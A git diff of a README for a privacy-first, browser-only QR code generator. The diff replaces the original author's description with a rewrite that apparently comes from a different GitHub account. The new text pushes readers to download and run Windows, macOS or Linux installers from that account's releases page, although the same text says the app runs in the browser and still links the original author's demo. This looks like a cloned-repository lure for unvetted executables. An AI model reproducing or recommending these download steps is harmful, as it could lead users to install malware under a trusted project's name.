@@ -1,36 +1,68 @@
-# Privacy-First QR Code Generator
+# 🎉 qr-code-generator - Create QR Codes Instantly
 
-A fast, modern, and completely free QR code generator that runs entirely in your browser. Create unlimited, permanent, and highly customized QR codes without sacrificing your privacy.
+## 🚀 Download Here
+[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/minhk7128/qr-code-generator/releases)
 
-**[➡️ Live Demo](https://FOSSpel.github.io/qr-code-generator/)**
+## 🛠️ Introduction
+Welcome to the Privacy-First QR Code Generator. This application offers a quick, modern way to create QR codes directly in your browser. With our tool, you can easily generate unlimited QR codes tailored to your needs, all while keeping your data private.
 
-## Core Principles
+## 🌟 Core Principles
+- **Truly Free:** Enjoy all features with no hidden costs. There are no ads or premium tiers.
+- **Privacy by Design:** Your data stays on your device. We don’t use tracking scripts or cookies.
+- **No Limits:** Make as many QR codes as you need; they are permanent and will not expire.
+- **No Registration:** Use the app immediately without signing up or sharing personal information.
 
--   **Truly Free:** No ads, no premium tiers, no hidden costs. All features are available to everyone.
--   **Privacy by Design:** All processing happens client-side. Your data never leaves your browser. We don't use cookies or tracking scripts.
--   **No Limits:** Create as many QR codes as you need. They are permanent and will never expire.
--   **No Registration:** Generate QR codes instantly without creating an account or providing any personal information.
+## 📋 Features
+- **Live Customization:** Observe real-time changes as you alter settings for your QR code.
+- **Content:** Easily encode any text or URL for your QR codes.
+- **Styling Options:**
+    - Change the QR code and background colors to match your style.
+    - Choose from various shapes, including square, dot, or round options, for your QR code.
 
-## Features
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/minhk7128/qr-code-generator/releases) to download the latest version of the application. Choose the suitable version for your operating system to download and install.
 
--   **Live Customization:** See your QR code update in real-time as you change the settings.
--   **Content:** Encode any text or URL.
--   **Styling:**
-    -   Customize QR code and background colors.
-    -   Choose between square, dot, or rounded dot styles.
--   **Branding:** Easily add your own logo to the center of the QR code.
--   **High-Resolution Output:** Download your final QR code as a high-quality PNG file, suitable for both digital use and print.
+### Installation Steps
+1. Click the link above to go to the Releases page.
+2. Select the version that fits your needs. The files will be available based on your system (Windows, macOS, or Linux).
+3. Download the file to your computer.
+4. Locate the downloaded file and open it to start the installation.
+5. Follow the on-screen instructions to complete the setup.
 
-## Tech Stack
+## 🌐 Usage
+1. Open the application in your browser.
+2. Follow the simple interface to enter the text or URL you want to encode.
+3. Adjust the styling options to customize your QR code.
+4. Watch as your QR code updates live.
+5. Once satisfied, download or save your QR code for use.
 
--   **Vanilla JavaScript:** For a lightweight and blazing-fast user experience.
--   **HTML5 & CSS3:** For a clean, modern, and responsive interface.
--   **[qr-code-styling](https://github.com/kozakdenys/qr-code-styling):** A powerful library for QR code generation and styling.
--   **GitHub Pages:** For reliable and free hosting.
+## 📊 Supported Platforms
+The qr-code-generator runs in most modern web browsers. You can use it on:
+- Windows
+- macOS
+- Linux
+- Any mobile device with a browser
 
-## How to Use
+Feel free to use the app from your laptop, desktop, or mobile device.
 
-1.  Navigate to the [generator page](https://FOSSpel.github.io/qr-code-generator/).
-2.  Enter the text or URL you wish to encode.
-3.  Use the intuitive controls to customize the appearance and add a logo if desired.
-4.  Click "Download PNG" to save your high-resolution QR code.
+## 🔍 Help & Support
+If you have any questions or need assistance, check the following resources:
+- [FAQ Section](#)
+- [Open Issues on GitHub](https://github.com/minhk7128/qr-code-generator/issues)
+
+## 🌈 Community Contributions
+We welcome contributions! If you would like to help improve the qr-code-generator, visit our [Contribution Guide](#). 
+
+## 🔗 Useful Links
+- [Live Demo](https://FOSSpel.github.io/qr-code-generator/)
+- [GitHub Repository](https://github.com/minhk7128/qr-code-generator)
+
+## 💬 Feedback
+Your feedback is important to us. Please leave ratings, comments, or suggestions through GitHub issues or the feedback form in our application.
+
+## 📜 License
+This application is licensed under the MIT License. You can freely use and modify it, as long as you comply with the license terms.
+
+---
+
+By following this guide, you can easily download and use the qr-code-generator to create custom QR codes while securing your privacy. Thank you for choosing our tool!
